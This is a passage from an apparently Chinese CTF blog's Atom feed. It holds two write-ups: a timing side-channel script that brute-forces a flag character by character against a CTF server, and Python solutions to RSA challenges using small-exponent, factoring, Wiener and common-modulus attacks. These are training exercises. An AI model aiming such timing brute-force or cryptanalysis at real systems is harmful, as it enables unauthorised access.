      <category term="Pwn" scheme="https://l1b0.fun/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>hackme-inndy-misc-slow</title>
    <link href="https://l1b0.fun/2018/07/30/hackme-inndy-misc-slow/"/>
    <id>https://l1b0.fun/2018/07/30/hackme-inndy-misc-slow/</id>
    <published>2018-07-30T12:14:46.000Z</published>
    <updated>2019-09-17T12:15:57.265Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目描述：OMG, It’s slow.</p><p>nc hackme.inndy.tw 7708</p></blockquote><h3 id="0x00-初探"><a href="#0x00-初探" class="headerlink" title="0x00 初探"></a>0x00 初探</h3><p>这道题没有附件，只给了一个nc，连上去后如下图</p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1ftqzhlitgfj30kp024mxc.jpg" alt="img"></p><p>可以知道flag格式为FLAG{\w+}，\w+\表示匹配字母，数字，下划线或加号，并且没有小写字母和空格，于是符合要求的字符有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+_</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 解题过程"></a>0x01 解题过程</h3><p>了解了flag格式后，觉得字符范围这么小，应该是要逐字符爆破，但怎样才算正确呢？</p><p>google之后了解到有一种叫<strong>时序攻击</strong>的手段，在密码学中是<strong>侧信道攻击</strong>的一种。原理大致是通过分析程序<strong>执行的时间</strong>来推导出正确的密码。</p><p>结合题目描述(OMG, It’s slow.)来看应该是与时间有关，于是测试延迟。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#此时的输入是FLAG&#123; + &apos;now_char&apos; + &apos;&#125;&apos;,长度为7</span><br><span class="line">$ python test_slow.py      </span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = A  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = B  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = C  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = D  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = E  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = F  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = G  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = H  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = I  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = J  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = K  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = L  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = M  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = N  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = O  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = P  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = Q  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = R  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = S  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = T  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = U  now_time = 7.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = V  now_time = 17.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = W  now_time = 7.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = X  now_time = 16.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = Y  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = Z  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 0  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 1  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 2  now_time = 7.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 3  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 4  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 5  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 6  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 7  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 8  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = 9  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = +  now_time = 6.0</span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7708: Done</span><br><span class="line">now_char = _  now_time = 6.0</span><br></pre></td></tr></table></figure><p>由于网络的原因，可能会有延迟过长的情况，不过可以通过当前字符的位置和当前延时比较来纠错。</p><p>经过分析不难发现，每正确一个字符，延迟加一秒，并且time = pos+1，以此我们可以写出爆破脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">import numpy</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">flag = &apos;FLAG&#123;&apos;</span><br><span class="line">max_time = len(flag)+1</span><br><span class="line">num = len(flag)+1</span><br><span class="line">string = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+_&apos;</span><br><span class="line"></span><br><span class="line">view = numpy.zeros((50,128))</span><br><span class="line">s = &apos;&apos;</span><br><span class="line">temp = &apos;&apos;</span><br><span class="line">while True:</span><br><span class="line">    for x in string:</span><br><span class="line">        #将已check过的字符标记，节省时间</span><br><span class="line">        if view[num][ord(x)] == 1:</span><br><span class="line">            continue</span><br><span class="line">        view[num][ord(x)] = 1</span><br><span class="line"></span><br><span class="line">        io = remote(&apos;hackme.inndy.tw&apos;,7708)</span><br><span class="line">        io.recvuntil(&apos;What is your flag?&apos;)</span><br><span class="line">        a = time.time()</span><br><span class="line">        io.sendline(flag+x+&apos;&#125;&apos;)</span><br><span class="line">        s = io.recvline()</span><br><span class="line">        #print temp == s</span><br><span class="line">        if temp == &apos;&apos;:</span><br><span class="line">            temp = s</span><br><span class="line">        io.close()</span><br><span class="line">        b = time.time()</span><br><span class="line">        print &quot;num = &#123;&#125;,now_time = &#123;&#125;, now_char = &#123;&#125;, recv = &#123;&#125;,max_time = &#123;&#125;&quot;.format(num,math.floor(b-a),x,s,max_time)</span><br><span class="line"></span><br><span class="line">        if math.floor(b-a) &gt; max_time:</span><br><span class="line">            flag += x</span><br><span class="line">            num += 1</span><br><span class="line">            max_time += 1</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        elif math.floor(b-a) &lt; max_time:</span><br><span class="line">            flag = flag[:-1]</span><br><span class="line">            num -=1</span><br><span class="line">            max_time -=1</span><br><span class="line">            print &apos;wrong,now back!&apos;</span><br><span class="line"></span><br><span class="line">    if s != temp:</span><br><span class="line">        print flag</span><br></pre></td></tr></table></figure><p>经测试，这个脚本要一直爆到出flag所需时间为要很久很久，估计得几个小时，我也没耐心跑完过，跑到后面直接猜出来了。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;题目描述：OMG, It’s slow.&lt;/p&gt;
&lt;p&gt;nc hackme.inndy.tw 7708&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-初探&quot;&gt;&lt;a href=&quot;#0x00-初探&quot; class=&quot;headerlink&quot; title=&quot;0x00 初探&quot;&gt;&lt;/a&gt;0x00 初探&lt;/h3&gt;&lt;p&gt;这道题没有附件，只给了一个nc，连上去后如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/mw690/0060lm7Tly1ftqzhlitgfj30kp024mxc.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以知道flag格式为FLAG{\w+}，\w+\表示匹配字母，数字，下划线或加号，并且没有小写字母和空格，于是符合要求的字符有&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+_&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Misc" scheme="https://l1b0.fun/tags/Misc/"/>
    
      <category term="时序攻击" scheme="https://l1b0.fun/tags/%E6%97%B6%E5%BA%8F%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Whitzard-CTF-RSA</title>
    <link href="https://l1b0.fun/2018/07/29/Whitzard-CTF-RSA/"/>
    <id>https://l1b0.fun/2018/07/29/Whitzard-CTF-RSA/</id>
    <published>2018-07-29T12:12:51.000Z</published>
    <updated>2019-09-17T12:14:10.418Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2018.7.29：在二进制训练营的时候做了下复旦OJ上的rsa，差一个level3没搞出来，这里记录一下脚本</p><p>2018.7.30：level3解出</p></blockquote><a id="more"></a><h3 id="0x00-level0-all-give-you"><a href="#0x00-level0-all-give-you" class="headerlink" title="0x00 level0_all_give_you"></a>0x00 level0_all_give_you</h3><p>题目给了p,q,n,e,c，直接解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Author__ = &quot;L1B0@10.0.0.55&quot;</span><br><span class="line"></span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">p=6224751407196587</span><br><span class="line"></span><br><span class="line">q=7943494850559647</span><br><span class="line"></span><br><span class="line">e=65537</span><br><span class="line"></span><br><span class="line">N=49446280749080005222860298324789</span><br><span class="line"></span><br><span class="line">cipher=18445170944028011076605277003494</span><br><span class="line"></span><br><span class="line">m = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,m)</span><br><span class="line"></span><br><span class="line">flag = n2s(pow(cipher,d,N))</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h3 id="0x01-level1-factor-N"><a href="#0x01-level1-factor-N" class="headerlink" title="0x01 level1_factor_N"></a>0x01 level1_factor_N</h3><p><a href="http://www.factordb.com/" target="_blank" rel="noopener">在线分解</a>N即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Author__ = &quot;L1B0@10.0.0.55&quot;</span><br><span class="line"></span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">e=65537</span><br><span class="line">N=578901120681462344392977129803201</span><br><span class="line">cipher=129662878945371130040081904349606</span><br><span class="line"></span><br><span class="line">#facotrize</span><br><span class="line">p = 809</span><br><span class="line">q = 715576168951127743378216476889</span><br><span class="line"></span><br><span class="line">m = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,m)</span><br><span class="line"></span><br><span class="line">flag = n2s(pow(cipher,d,N))</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h3 id="0x02-level2-e-3"><a href="#0x02-level2-e-3" class="headerlink" title="0x02 level2_e=3"></a>0x02 level2_e=3</h3><p>低加密指数攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Author__ = &quot;L1B0@10.0.0.55&quot;</span><br><span class="line"></span><br><span class="line">from gmpy2 import iroot</span><br><span class="line">from libnum import n2s</span><br><span class="line"></span><br><span class="line">e=3</span><br><span class="line">n=1644116071238440794835968435021522925333145828466704580586342018443583533528696283940813360961939555816101473973555088162098477</span><br><span class="line">c=874548130355489823053470195390273835709184088374326753413151756170831483190524376329024877919019666940077812490613442032246774</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    if iroot(c + i * n, 3)[1] == True:</span><br><span class="line">        print &quot;Success!&quot;</span><br><span class="line">        print iroot(c + i * n, 3)</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">print n2s(8663725283768549127679518803938707801269629L)</span><br></pre></td></tr></table></figure><h3 id="0x03-level3-e-33"><a href="#0x03-level3-e-33" class="headerlink" title="0x03 level3_e=33"></a>0x03 level3_e=33</h3><blockquote><p>Solved at 2018.7.29 17:30pm</p></blockquote><p>这道题很有意思，e=33,直接求逆元是求不出来的，如下图</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1ftr1b7cy4rj30bp02yglt.jpg" alt="img"></p><h4 id="求解推导"><a href="#求解推导" class="headerlink" title="求解推导"></a>求解推导</h4><p>我们知道 ( flag ** e ) mod N == cipher，这里e = 33</p><p>那么将e分解，e = e1<em>e2 = 3</em>11</p><p>故{ ( flag ** e1 ) ** e2 } mod N == cipher，即 { ( flag ** 3 ) ** 11 } mod N == cipher</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>按照level0的思路，我们可以直接把flag**3当做一个新的明文flag1</p><blockquote><p>e2 = 11</p><p>N2 = N</p><p>p2 = p</p><p>q2 = p</p><p>cipher2 = cipher</p></blockquote><p>直接解出flag1</p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>然后出了一点问题：直接对flag1开三次方，发现无解。</p><p>后来发现我这里算出来的flag1是一定小于N的，而flag**3不一定小于N。</p><p>也就是说 ( flag**3 ) mod N = flag1</p><p>这里又是一组rsa，并且e=3，那直接低加密指数攻击即可。</p><blockquote><p>e1 = 3</p><p>N1 = N</p><p>cipher1 = flag1</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">import gmpy2</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">e=33</span><br><span class="line">p=954147044541943113765937481348204894039415441663225351583</span><br><span class="line">q=1343515508931258195091391392918235484113725429556823769736956904341937</span><br><span class="line">N=1281911352143024584350260661717626471379161729718150347407768402523661151300375453147248077816866067782874939959917466076236271</span><br><span class="line">cipher=1197113886220503890500226974976842298261128760760143948519182172387778320755699233509310951033610880543097406233423486693032107</span><br><span class="line"></span><br><span class="line">m = (p-1)*(q-1)</span><br><span class="line">#print &apos;m = &#123;&#125;&apos;.format(m)</span><br><span class="line"></span><br><span class="line">#(flag**3)**11 mod N == cipher</span><br><span class="line">#flag1 = flag**3</span><br><span class="line"></span><br><span class="line">e1 = 11</span><br><span class="line">m1 = m</span><br><span class="line">d1 = gmpy2.invert(e1,m1) </span><br><span class="line">#print d1</span><br><span class="line"></span><br><span class="line">flag1 = pow(cipher,d1,N)</span><br><span class="line">#print pow(flag1,e1,N) == cipher</span><br><span class="line">print flag1</span><br><span class="line"></span><br><span class="line">#e=3</span><br><span class="line">n = N</span><br><span class="line">c = flag1</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    if gmpy2.iroot(c + i * n, 3)[1] == True:</span><br><span class="line">        print &quot;Success!&quot;</span><br><span class="line">        print gmpy2.iroot(c + i * n, 3)</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">print n2s(8663725283690131533285369823529813978998141)</span><br><span class="line">#flag = n2s(pow(cipher,d,N))</span><br><span class="line">#print flag</span><br></pre></td></tr></table></figure><blockquote><p>一个小技巧：大数分解可以用gmpy2.iroot()</p></blockquote><h3 id="0x04-level4-wiener-attack"><a href="#0x04-level4-wiener-attack" class="headerlink" title="0x04 level4_wiener_attack"></a>0x04 level4_wiener_attack</h3><p><a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">wiener_attack脚本</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Author__ = &quot;L1B0@10.0.0.55&quot;</span><br><span class="line"></span><br><span class="line">from libnum import n2s</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">e=160222447153262895889250928158012827757109871196102040037421857250766491575699886894325697077956068896677359953037375582060511979328323570880578946073240834317364119936983046746942944368567355131867682895196198904859001202051459879133425754080440276218324680838480108302184726980362910704693149535052743526713</span><br><span class="line">n=356096033429997161372356441930246707554046995590506452306084931488519008238592151695866774341246347160182054216879883209187019942641996111166252052256475412435016177136773967956292472785118669272929844214105480922945372638910276569650465033695573697459823872295312452877368652943145314840314022954151337366463</span><br><span class="line">cipher=81734547217423194200627584129880698303540239605864202915000885082303608683684019444597240499822470812273165739947662626400159428633441652507543459604648534096971317225195148800012614358689629135280756866839465060038852820973512256929393244791492926888258798803335090942130962336363237126444758225836896001850</span><br><span class="line"></span><br><span class="line">#wiener_attack</span><br><span class="line">d = 731297</span><br><span class="line"></span><br><span class="line">print n2s(pow(cipher,d,n))</span><br></pre></td></tr></table></figure><h3 id="0x05-level5-Common-Modulus-Attack"><a href="#0x05-level5-Common-Modulus-Attack" class="headerlink" title="0x05 level5_Common_Modulus_Attack"></a>0x05 level5_Common_Modulus_Attack</h3><p>共模攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Author__ = &quot;L1B0@10.0.0.55&quot;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from libnum import n2s</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        return (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    if g != 1:</span><br><span class="line">        raise Exception(&apos;modular inverse does not exist&apos;)</span><br><span class="line">    else:</span><br><span class="line">    return x % m</span><br><span class="line"></span><br><span class="line">n = 67429986223463725630760851214095205122861566712757096290156130852775779636888134368717091439692391485149944760480157303572754994563434765296623953452761257431107573064032023044818486821895477023173750051598133603675847214577862821214777097737040107831560275593671162948631151791</span><br><span class="line"></span><br><span class="line">e1 = 61967635785437322652331201078567365048930922666568441115110461719490654534113</span><br><span class="line">e2 = 205766126176929848227168949492841490531179790972829078582852699147634573122171458527896514644790639038940007774239040950019816134072019031167</span><br><span class="line"></span><br><span class="line">c1 = 5822762981879944424561473864620287634409555456758877462439567398879989944707712816448957643839287371123037868433108662054545710675854869153861985791456418794257498996377335090618281582018030521712938036930671348275101114834456069272996599241973297974161300649826701817737861423L</span><br><span class="line">c2 = 705997633009417848857145957952988147669825773624353180591567961488716033203631101756073664193075066102031563449119189790932235272762840949103671277483248720788931071047154630535727579468256892221981227270895827194426781684443499389831949250120695006941674077440102842342282716L</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = egcd(e1,e2)</span><br><span class="line">s1 = s[1]</span><br><span class="line">s2 = s[2]</span><br><span class="line">print s1,s2</span><br><span class="line"></span><br><span class="line">if s1 &lt; 0:</span><br><span class="line">    s1 = -s1</span><br><span class="line">    c1 = modinv(c1,n)</span><br><span class="line">if s2 &lt; 0:</span><br><span class="line">    s2 = -s2</span><br><span class="line">    c2 = modinv(c2,n)</span><br><span class="line"></span><br><span class="line">print c1,c2</span><br><span class="line">m = (pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line">print(n2s(m))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;2018.7.29：在二进制训练营的时候做了下复旦OJ上的rsa，差一个level3没搞出来，这里记录一下脚本&lt;/p&gt;
&lt;p&gt;2018.7.30：level3解出&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Crypto" scheme="https://l1b0.fun/tags/Crypto/"/>
    
      <category term="RSA" scheme="https://l1b0.fun/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>InForSec夏令营-二进制训练营总结</title>
